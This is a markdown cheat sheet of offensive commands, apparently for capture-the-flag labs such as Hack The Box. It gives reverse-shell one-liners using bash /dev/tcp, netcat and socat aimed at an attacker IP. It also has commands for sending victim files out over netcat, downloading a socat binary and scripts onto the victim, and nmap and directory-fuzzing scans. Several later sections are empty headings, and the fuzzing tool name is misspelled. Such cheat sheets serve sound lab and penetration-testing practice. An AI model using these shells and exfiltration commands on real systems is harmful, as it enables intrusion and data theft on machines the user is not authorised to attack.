# Useful Commands

## Create web server

### With Python

```
python3 -m http.server 8888
``` 

```
python -m SimpleHTTPServer 8888
```

## Upgrade reverse shell

### With Socat

*Victim:* 
```
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O socat
chmod +x socat
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.10:4444
```
        
*Kali:*
```
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

### With Python

*Victim:* 
```
python3 -c 'import pty; pty.spawn("/bin/sh")'
```

## Send files

### With netcat

*Victim:*
```
cat file.txt | nc -q 0 10.10.10.10 4444
```

*Kali:*
```
nc -lvp 4444 > file.txt
```

### With web server

*Kali:*
```
python3 -m http.server 8888 
```

```
python -m SimpleHTTPServer 8888
```

*Victim:* 
```
wget http://10.10.10.10:8888/something.sh -O something.sh
```

## Reverse shells

### With bash

```
bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
```

### With netcat

```
nc -e /bin/sh 10.10.10.10 4444
```

### Listener

```
nc -lvp 4444
```

# Enumeration

### Nmap

TCP Scan:

```
nmap -sV -sC -p- 10.10.10.77
```

UDP Scan:

```
nmap -sU -sV -p- 10.10.10.77
```

## If Web Server

### dirb

Quick directory busting

```
dirb http://10.10.10.77/
```

### fuff

VHOST Discovery

```
fuf -w /home/kali/HTB/Laboratory/subdomains-top1million-110000.txt -u https://laboratory.htb/ -H "Host:FUZZ.laboratory.htb"
```

# Privilege Escalation

# Reverse Engineering

# Some Scripts

# References
